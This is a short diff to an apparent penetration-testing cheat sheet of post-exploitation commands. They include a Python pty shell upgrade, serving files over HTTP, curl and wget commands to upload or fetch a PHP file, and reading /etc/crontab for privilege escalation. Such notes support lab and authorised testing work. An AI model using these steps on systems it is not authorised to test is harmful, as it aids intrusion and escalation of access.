@@ -29,9 +29,14 @@ https://www.youtube.com/watch?v=3XgGjEG0lLw
 # Shell Upgrade
 ## Python
 python -c 'import pty; pty.spawn("/bin/bash")'
-# Tool Transfer
+# File Hosting
 ## Python
 python3 -m http.server 8080
+# File Transfer
+## Curl
+curl -T file.php -u 'username:password' http://127.0.0.1/
+## Wget
+wget http://127.0.0.1/file.php
 # Privilege Escalation
 ## Crontab
 cat /etc/crontab
